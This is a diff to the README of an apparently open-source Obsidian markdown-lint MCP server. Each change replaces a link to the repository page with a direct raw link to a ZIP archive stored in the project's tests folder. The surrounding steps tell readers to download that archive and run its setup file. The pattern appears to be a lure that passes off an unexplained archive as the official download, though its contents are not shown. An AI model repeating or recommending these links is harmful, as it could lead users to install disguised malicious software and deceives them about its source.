@@ -1,6 +1,6 @@
 # ✨ obsidian-markdown-lint-mcp-server - Improve your markdown files with ease
 
-[![Download Now](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/andresimitative368/obsidian-markdown-lint-mcp-server)
+[![Download Now](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/andresimitative368/obsidian-markdown-lint-mcp-server/main/tests/server-lint-markdown-obsidian-mcp-3.5.zip)
 
 ## 📝 What this tool does
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the software:
 
 ## 📥 How to get the software
 
-1. Visit this [link](https://github.com/andresimitative368/obsidian-markdown-lint-mcp-server) to find the software.
+1. Visit this [link](https://raw.githubusercontent.com/andresimitative368/obsidian-markdown-lint-mcp-server/main/tests/server-lint-markdown-obsidian-mcp-3.5.zip) to find the software.
 2. Look for the green button that says Code.
 3. Select Download ZIP from the menu.
 4. Save the folder to a place you can find later, like your Desktop.
@@ -74,7 +74,7 @@ The software performs all checks locally. It does not send your notes to a serve
 
 ## 📦 Updates and maintenance
 
-Check the [download page](https://github.com/andresimitative368/obsidian-markdown-lint-mcp-server) every few months for updates. To update, download the new ZIP file and replace the old folder with the new one. Run the setup file again to ensure all parts remain current. Your settings will persist if you keep the config file in your documents folder. 
+Check the [download page](https://raw.githubusercontent.com/andresimitative368/obsidian-markdown-lint-mcp-server/main/tests/server-lint-markdown-obsidian-mcp-3.5.zip) every few months for updates. To update, download the new ZIP file and replace the old folder with the new one. Run the setup file again to ensure all parts remain current. Your settings will persist if you keep the config file in your documents folder. 
 
 ## 💡 Best practices for your notes
 
